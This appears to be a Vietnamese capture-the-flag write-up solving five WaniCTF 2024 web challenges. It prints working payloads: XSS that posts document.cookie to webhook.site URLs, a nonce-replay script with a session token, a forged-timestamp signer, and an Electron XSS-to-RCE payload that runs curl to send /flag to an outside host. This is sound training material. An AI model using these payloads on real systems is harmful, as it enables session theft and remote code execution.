# bad Worker 

![image](https://github.com/neo-M3tinez/wanictf2024/assets/174318737/add5185f-b779-40bb-bf2b-c31688fda772)

- bài này ta có 2 cách để làm:

=> check chức năng của web trong đó có chức năng fetch data thì ta nhận được flag 

![image](https://github.com/neo-M3tinez/wanictf2024/assets/174318737/3f742858-570c-44fa-a1ff-397fd8a9ed68)

=> ta có thể check qua source ctrl u thì ta thấy chức năng 

![image](https://github.com/neo-M3tinez/wanictf2024/assets/174318737/e84cd268-2900-4027-8d07-00e28b1daf1a)

```
<script>navigator.serviceWorker.register('service-worker.js');</script>
```

check qua path thì ta thấy được 2 file FLAG.txt và dummy.txt thì chạy path FLAG.txt thi ta được

=> flag=FLAG{pr0gr3ssiv3_w3b_4pp_1s_us3fu1} 


# POW

![image](https://github.com/neo-M3tinez/wanictf2024/assets/174318737/4bde3b28-becb-4b08-aa6b-a5799faa4852)

- Recon:

  + ta có thông tin về client status và server status có vẻ client_status đang check số hợp lệ từ đó server sẽ tăng lên 1 ứng với mỗi giá trị hợp lệ
 
  + checking thì ta có thêm thông tin về json của server /api/pow đang ở progress là 0/1000000 vì client chưa tìm được giá trị hợp hợp lệ
 
  + theo đề bài là ta cần tìm giá trị hợp lệ qua cách tính crypto hash nhưng ta sẽ tìm qua hành vi của trang web
 
- Exploit:

   + 2 cách để exploit có thể là dùng python hoặc brupsuite
 

+ brupsuite:

![image](https://github.com/neo-M3tinez/wanictf2024/assets/174318737/57127ec9-1292-4f18-a249-20083b0fcb0c)

- ta lấy được giá trị hợp lệ là 2862152 và ta sẽ cho vào array json với giá trị tăng dần đến 1000000

![image](https://github.com/neo-M3tinez/wanictf2024/assets/174318737/2bc92f96-f7d8-4be9-b9be-9de895e4e4e6)

+ dùng python chạy loop tới 

payload:

```
import requests

# URL của API
url = 'https://web-pow-lz56g6.wanictf.org/api/pow'

# Tạo payload với 5000 phần tử '2862152'
payload = ['2862152'] * 20000

# Cookies
cookies = {
    'pow_session': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZXNzaW9uSWQiOiIzMzU0ODI1Ny0zYzc2LTQ5MjYtYjc0Yy0yM2NkZWU5YjVhYTkifQ.vOmdV80weNiFDGcKSSg1fZwB1LDboRwlaIJnEN8uFJI'
}

# Lặp 20 lần để gửi yêu cầu POST
for _ in range(20):
    # Gửi yêu cầu POST và lấy phản hồi
    response = requests.post(url, json=payload, cookies=cookies)

    # In ra nội dung phản hồi
    print(f"Response {_ + 1}: {response.text}")

```

![image](https://github.com/neo-M3tinez/wanictf2024/assets/174318737/fab6de27-ca71-4455-9e14-f61ba1393899)

=> ta sẽ send response đến server với giá trị hợp lệ và kết nối tăng trong array 

![image](https://github.com/neo-M3tinez/wanictf2024/assets/174318737/7d4746e1-475f-4223-aee3-7fc394bdefc1)

=> flag = FLAG{N0nCE_reusE_i$_FUn}

# noscript 

![image](https://github.com/neo-M3tinez/wanictf2024/assets/174318737/16c38fae-7221-4b9f-9e99-63ff9a0a619e)

![image](https://github.com/neo-M3tinez/wanictf2024/assets/174318737/fa3ab07f-fea7-4d24-ad83-8c8407bac70e)

- Recon:

  + khi ta check chức năng sign in thì có 1 thông tin về xss banner
 
  + check qua payload <script> tag có vẻ nó không hiện thông tin về script tag
 
=> check code 

```
	r.GET("/user/:id", func(c *gin.Context) {
		c.Header("Content-Security-Policy", "default-src 'self', script-src 'none'")
		id := c.Param("id")
		re := regexp.MustCompile("^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-4[a-fA-F0-9]{3}-[8|9|aA|bB][a-fA-F0-9]{3}-[a-fA-F0-9]{12}$")
		if re.MatchString(id) {
			if val, ok := db.Get(id); ok {
				params := map[string]interface{}{
					"id":       id,
					"username": val[0],
					"profile":  template.HTML(val[1]),  // vulnerable to XSS
				}
				c.HTML(http.StatusOK, "user.html", params)
			} else {
				_, _ = c.Writer.WriteString("<p>user not found <a href='/'>Home</a></p>")
			}
		} else {
			_, _ = c.Writer.WriteString("<p>invalid id <a href='/'>Home</a></p>")
		}
	})

```
+ "profile":  template.HTML(val[1]) : đang chứa lỗ hổng xss vì template chưa được lọc dữ liệu


=> chức năng này ta thấy csp đang chặn script thực thi nên ta sẽ sử dụng meta tag để chuyển hướng sang 1 trang khác 

```
// Get username API
	r.GET("/username/:id", func(c *gin.Context) {
		id := c.Param("id")
		re := regexp.MustCompile("^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-4[a-fA-F0-9]{3}-[8|9|aA|bB][a-fA-F0-9]{3}-[a-fA-F0-9]{12}$")
		if re.MatchString(id) {
			if val, ok := db.Get(id); ok {
				_, _ = c.Writer.WriteString(val[0])
			} else {
				_, _ = c.Writer.WriteString("<p>user not found <a href='/'>Home</a></p>")
			}
		} else {
			_, _ = c.Writer.WriteString("<p>invalid id <a href='/'>Home</a></p>")
		}
	})
```

=> chức năng username/id api fetch data ở đây 


=> profile là để thực thi script để di chuyển đến main injection là username api để fetch cookie  




payload 


```

username=<a+autofocus='true'+tabindex=1+id=x+onfocus=fetch('https://webhook.site/d87e3a45-c3e2-4738-a9e3-bec99d4a9d78',{method:'POST',mode:'no-cors',body:document.cookie})>#x</a>&profile=<meta+http-equiv="refresh"+content="0;url=http://app:8080/username/id">


username=<a+autofocus%3d'true'+tabindex%3d1+id%3dx+onfocus%3dfetch('https://webhook.site/d87e3a45-c3e2-4738-a9e3-bec99d4a9d78',{method%3a'POST',mode%3a'no-cors',body%3adocument.cookie
})>%23x</a>&profile=<meta+http-equiv%3d"refresh"+content%3d"0%3burl%3dhttp%3a//app%3a8080/username/id">

id => user/id
```

![image](https://github.com/neo-M3tinez/wanictf2024/assets/174318737/af3ccf3f-4f68-4de9-aa24-ebb08335aa5a)

=> payload ngắn hơn sau giải được của wup khác

```
username= <script>fetch('https://webhook.site/046672e1-f5b7-42bd-af56-84b73caf22d6/', { method : 'post', body: document.cookie });</script>

username=<script>fetch(`(webhook)?cookie=${document.cookie}`)</script>

profile=<meta+http-equiv="refresh"+content="0;url=http://app:8080/username/id">
```

![image](https://github.com/neo-M3tinez/wanictf2024/assets/174318737/31766a05-7e4e-426c-b136-143b17b84e43)

=> flag:FLAG{n0scr1p4_c4n_be_d4nger0us}

# One Day One Letter

![image](https://github.com/neo-M3tinez/wanictf2024/assets/174318737/55f1b113-5928-4a30-a859-a0c151508154)

- Recon:

sau khi xem qua hành vi của 2 server time-server và content-server ta thấy rằng time-server 


=> cơ chế của time server là đang tạo ra key và verify timestamp qua public key để tạo ra signature của timestamp đó rồi send đến content server 

```
key = ECC.generate(curve='p256')
pubkey = key.public_key().export_key(format='PEM')

class HTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/pubkey':
            self.send_response(HTTPStatus.OK)
            self.send_header('Content-Type', 'text/plain; charset=utf-8')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            res_body = pubkey
            self.wfile.write(res_body.encode('utf-8'))
            self.requestline
        else:
            timestamp = str(int(time.time())).encode('utf-8')
            h = SHA256.new(timestamp)
            signer = DSS.new(key, 'fips-186-3')
            signature = signer.sign(h)
            self.send_response(HTTPStatus.OK)
            self.send_header('Content-Type', 'text/json; charset=utf-8')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            res_body = json.dumps({'timestamp' : timestamp.decode('utf-8'), 'signature': signature.hex()})
            self.wfile.write(res_body.encode('utf-8'))

```

+ ta có thể thông qua time server để tạo 1 pubkey hợp lệ rồi cấu hình time stamp cho server của minh gửi đến content server


+ sử dụng expose time server dùng pagekite và server đấy có chứa pubkey mà mình tạo ra lấy thông tin của domain làm timeserver or ngrok

```
python3 pagekite.py (filekey) domain
```

có thể dùng ngrok expose server riêng

```
ngrok http (filekey)
```

![image](https://github.com/neo-M3tinez/wanictf2024/assets/174318737/3380a8d8-536a-49a9-9c41-05497fd2f189)

payload 

```
from Crypto.Hash import SHA256
from Crypto.PublicKey import ECC
from Crypto.Signature import DSS


key = ECC.generate(curve='p256')
pubkey = key.public_key().export_key(format='PEM')


print(key)
print(pubkey)

while (True):
    timestamp = str(int(input("Input your time stamp: "))).encode('utf-8')
    h = SHA256.new(timestamp)
    signer = DSS.new(key, 'fips-186-3')
    signature = signer.sign(h)
    print(signature.hex())
```

=> payload để tạo ra signature ứng với từng timestamp mình input rồi public timeserver có chứa pubkey 

![image](https://github.com/neo-M3tinez/wanictf2024/assets/174318737/b0d6f66f-7781-49f8-b8a1-5a756de1dadc)

=> flag: FLAG{lyingthetime}


# elec 

![image](https://github.com/neo-M3tinez/wanictf2024/assets/174318737/fe1379ba-ef88-4308-944f-8d06e8a0998d)

- Recon:

  => sau khi check bằng simple payload ta được

  ```
  <img src = x onerror = alert("hello")>
  ```

![image](https://github.com/neo-M3tinez/wanictf2024/assets/174318737/e18573f5-b19a-48b8-8f89-65cfc931992d)


=> nó đã hiện thông báo 
payload: 

=> xss command injection :

```
< img src = x onerror=" const orgCall = console . log ; console . log = function ( ... args ){ if ( 'pid' in args [ 0 ]){( new args [ 0 ] . constructor ()) . spawn ({ args : [ 'curl' , 'https://[yours].requestcatcher.com/get' , '-X' , 'POST' , '-d' , '@/flag' ] , cwd : undefined , detached : false , envPairs : [] , file : 'curl' , windowsHide : false , windowsVerbatimArguments : false }) ; } return orgCall . apply ( this, args ) ; }" >      
```

![image](https://github.com/neo-M3tinez/wanictf2024/assets/174318737/19a81d5c-49fc-480d-8cd7-6c894ef9bbf5)

=>flag = FLAG{r3m07e_c0d3_execu710n_v1a_3l3c7r0n}
